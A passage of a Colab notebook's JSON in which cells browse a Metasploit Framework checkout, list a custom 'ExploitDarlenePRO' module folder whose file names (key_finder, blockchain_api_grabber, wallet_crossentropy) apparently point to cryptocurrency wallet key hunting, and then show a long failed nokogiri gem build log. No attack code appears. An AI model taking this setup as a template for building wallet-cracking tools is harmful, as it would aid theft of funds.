            "decode_core.rb             \u001b[01;34mfreebsd\u001b[0m/               \u001b[01;34mnetware\u001b[0m/       \u001b[01;34mwindows\u001b[0m/\n",
            "\u001b[01;34mdialup\u001b[0m/                    \u001b[01;34mhpux\u001b[0m/                  \u001b[01;34mopenbsd\u001b[0m/\n",
            "example_linux_priv_esc.rb  injection_database.rb  \u001b[01;34mosx\u001b[0m/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd ExploitDarlenePRO/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "dO_q9Zh9ilgW",
        "outputId": "6afcc7bc-bee4-4fa4-8e83-50419cd466c6"
      },
      "execution_count": 30,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/metasploit-framework/modules/exploits/ExploitDarlenePRO\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "o_hRFOr_in2B",
        "outputId": "77f59727-ee7b-405d-b11b-fc351e553a40"
      },
      "execution_count": 31,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "blockchain_api_grabber.rb  extract_number.rb      main.rb          simplistic_approach.rb\n",
            "config.rb                  injection_database.rb  model_nn.rb      vulnerability_scanner.rb\n",
            "decode_core.rb             key_finder.rb          seed_mt_unit.rb  wallet_crossentropy.rb\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd /"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YZh3onLuiqQq",
        "outputId": "81bdb1f7-3c81-4906-ecf5-0e05ce32d1ae"
      },
      "execution_count": 32,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd content/metasploit-framework/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "t9to8w_GisMV",
        "outputId": "80c0f912-960d-4c37-b547-18c87624f0df"
      },
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/metasploit-framework\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "j6KDj5R4iuUO",
        "outputId": "020c6c1d-1301-491c-e6e1-9aa928b9cb09"
      },
      "execution_count": 34,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!ip addr\n",
        "!hostname -I"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "T0q51iO2iwu6",
        "outputId": "d27c2948-7cf0-4062-8b81-0ade0ffbdabc"
      },
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n",
            "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n",
            "    inet 127.0.0.1/8 scope host lo\n",
            "       valid_lft forever preferred_lft forever\n",
            "9: eth0@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default \n",
            "    link/ether 02:42:ac:1c:00:0c brd ff:ff:ff:ff:ff:ff link-netnsid 0\n",
            "    inet 172.28.0.12/16 brd 172.28.255.255 scope global eth0\n",
            "       valid_lft forever preferred_lft forever\n",
            "172.28.0.12 \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "K0ELg3I2jcNB",
        "outputId": "71b5ade9-1df6-4d55-9ccd-82e729b24b9e"
      },
      "execution_count": 37,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CUQv2dpEpRXJ",
        "outputId": "51906fef-451f-47de-f57f-23ffac3d2cb3"
      },
      "execution_count": 47,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov-clover"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_Z7D6InCqES7",
        "outputId": "97a592c9-bd02-421c-8f1d-6fd1fa7950a2"
      },
      "execution_count": 53,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching mini_portile-0.6.2.gem\n",
            "Fetching simplecov-rcov-0.2.3.gem\n",
            "Fetching nokogiri-1.6.4.1.gem\n",
            "Fetching simplecov-clover-0.0.1.gem\n",
            "Successfully installed simplecov-rcov-0.2.3\n",
            "Successfully installed mini_portile-0.6.2\n",
            "Building native extensions. This could take a while...\n",
            "ERROR:  Error installing simplecov-clover:\n",
            "\tERROR: Failed to build gem native extension.\n",
            "\n",
            "    current directory: /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ext/nokogiri\n",
            "/usr/bin/ruby3.0 -I /usr/lib/ruby/vendor_ruby -r ./siteconf20241116-15404-l22xhm.rb extconf.rb\n",
            "checking if the C compiler accepts ... yes\n",
            "Building nokogiri using packaged libraries.\n",
            "checking for iconv... yes\n",
            "************************************************************************\n",
            "IMPORTANT NOTICE:\n",
            "\n",
            "Buidling Nokogiri with a packaged version of libxml2-2.9.2\n",
            "with the following patches applied:\n",
            "\t- 0001-Revert-Missing-initialization-for-the-catalog-module.patch\n",
            "\t- 0002-Fix-missing-entities-after-CVE-2014-3660-fix.patch\n",
            "\n",
            "Team Nokogiri will keep on doing their best to provide security\n",
            "updates in a timely manner, but if this is a concern for you and want\n",
            "to use the system library instead; abort this installation process and\n",
            "reinstall nokogiri as follows:\n",
            "\n",
            "    gem install nokogiri -- --use-system-libraries\n",
            "        [--with-xml2-config=/path/to/xml2-config]\n",
            "        [--with-xslt-config=/path/to/xslt-config]\n",
            "\n",
            "If you are using Bundler, tell it to use the option:\n",
            "\n",
            "    bundle config build.nokogiri --use-system-libraries\n",
            "    bundle install\n",
            "\n",
            "Note, however, that nokogiri is not fully compatible with arbitrary\n",
            "versions of libxml2 provided by OS/package vendors.\n",
            "************************************************************************\n",
            "Extracting libxml2-2.9.2.tar.gz into tmp/x86_64-linux-gnu/ports/libxml2/2.9.2... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxml2/0001-Revert-Missing-initialization-for-the-catalog-module.patch...\n",
            "Running 'patch' for libxml2 2.9.2... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxml2/0002-Fix-missing-entities-after-CVE-2014-3660-fix.patch...\n",
            "Running 'patch' for libxml2 2.9.2... OK\n",
            "Running 'configure' for libxml2 2.9.2... OK\n",
            "Running 'compile' for libxml2 2.9.2... OK\n",
            "Running 'install' for libxml2 2.9.2... OK\n",
            "Activating libxml2 2.9.2 (from /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/x86_64-linux-gnu/libxml2/2.9.2)...\n",
            "************************************************************************\n",
            "IMPORTANT NOTICE:\n",
            "\n",
            "Buidling Nokogiri with a packaged version of libxslt-1.1.28\n",
            "with the following patches applied:\n",
            "\t- 0001-Adding-doc-update-related-to-1.1.28.patch\n",
            "\t- 0002-Fix-a-couple-of-places-where-f-printf-parameters-wer.patch\n",
            "\t- 0003-Initialize-pseudo-random-number-generator-with-curre.patch\n",
            "\t- 0004-EXSLT-function-str-replace-is-broken-as-is.patch\n",
            "\t- 0006-Fix-str-padding-to-work-with-UTF-8-strings.patch\n",
            "\t- 0007-Separate-function-for-predicate-matching-in-patterns.patch\n",
            "\t- 0008-Fix-direct-pattern-matching.patch\n",
            "\t- 0009-Fix-certain-patterns-with-predicates.patch\n",
            "\t- 0010-Fix-handling-of-UTF-8-strings-in-EXSLT-crypto-module.patch\n",
            "\t- 0013-Memory-leak-in-xsltCompileIdKeyPattern-error-path.patch\n",
            "\t- 0014-Fix-for-bug-436589.patch\n",
            "\t- 0015-Fix-mkdir-for-mingw.patch\n",
            "\n",
            "Team Nokogiri will keep on doing their best to provide security\n",
            "updates in a timely manner, but if this is a concern for you and want\n",
            "to use the system library instead; abort this installation process and\n",
            "reinstall nokogiri as follows:\n",
            "\n",
            "    gem install nokogiri -- --use-system-libraries\n",
            "        [--with-xml2-config=/path/to/xml2-config]\n",
            "        [--with-xslt-config=/path/to/xslt-config]\n",
            "\n",
            "If you are using Bundler, tell it to use the option:\n",
            "\n",
            "    bundle config build.nokogiri --use-system-libraries\n",
            "    bundle install\n",
            "************************************************************************\n",
            "Extracting libxslt-1.1.28.tar.gz into tmp/x86_64-linux-gnu/ports/libxslt/1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0001-Adding-doc-update-related-to-1.1.28.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0002-Fix-a-couple-of-places-where-f-printf-parameters-wer.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0003-Initialize-pseudo-random-number-generator-with-curre.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0004-EXSLT-function-str-replace-is-broken-as-is.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0006-Fix-str-padding-to-work-with-UTF-8-strings.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0007-Separate-function-for-predicate-matching-in-patterns.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0008-Fix-direct-pattern-matching.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0009-Fix-certain-patterns-with-predicates.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0010-Fix-handling-of-UTF-8-strings-in-EXSLT-crypto-module.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0013-Memory-leak-in-xsltCompileIdKeyPattern-error-path.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0014-Fix-for-bug-436589.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running patch with /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/patches/libxslt/0015-Fix-mkdir-for-mingw.patch...\n",
            "Running 'patch' for libxslt 1.1.28... OK\n",
            "Running 'configure' for libxslt 1.1.28... OK\n",
            "Running 'compile' for libxslt 1.1.28... OK\n",
            "Running 'install' for libxslt 1.1.28... OK\n",
            "Activating libxslt 1.1.28 (from /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ports/x86_64-linux-gnu/libxslt/1.1.28)...\n",
            "checking for -llzma... yes\n",
            "checking for xmlParseDoc() in libxml/parser.h... yes\n",
            "checking for xsltParseStylesheetDoc() in libxslt/xslt.h... yes\n",
            "checking for exsltFuncRegister() in libexslt/exslt.h... yes\n",
            "checking for xmlHasFeature()... yes\n",
            "checking for xmlFirstElementChild()... yes\n",
            "checking for xmlRelaxNGSetParserStructuredErrors()... yes\n",
            "checking for xmlRelaxNGSetParserStructuredErrors()... yes\n",
            "checking for xmlRelaxNGSetValidStructuredErrors()... yes\n",
            "checking for xmlSchemaSetValidStructuredErrors()... yes\n",
            "checking for xmlSchemaSetParserStructuredErrors()... yes\n",
            "creating Makefile\n",
            "\n",
            "current directory: /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ext/nokogiri\n",
            "make DESTDIR\\= clean\n",
            "\n",
            "current directory: /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1/ext/nokogiri\n",
            "make DESTDIR\\=\n",
            "compiling html_document.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:44,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_document.h:4,\n",
            "                 from html_document.c:1:\n",
            "html_document.c: In function ‘new’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "html_document.c:16:3: note: in expansion of macro ‘rb_scan_args’\n",
            "   16 |   rb_scan_args(argc, argv, \"0*\", &rest);\n",
            "      |   ^~~~~~~~~~~~\n",
            "html_document.c: In function ‘type’:\n",
            "html_document.c:148:18: warning: conversion to ‘int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  148 |   return INT2NUM((long)doc->type);\n",
            "      |                  ^~~~~~~~~~~~~~~\n",
            "compiling html_element_description.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
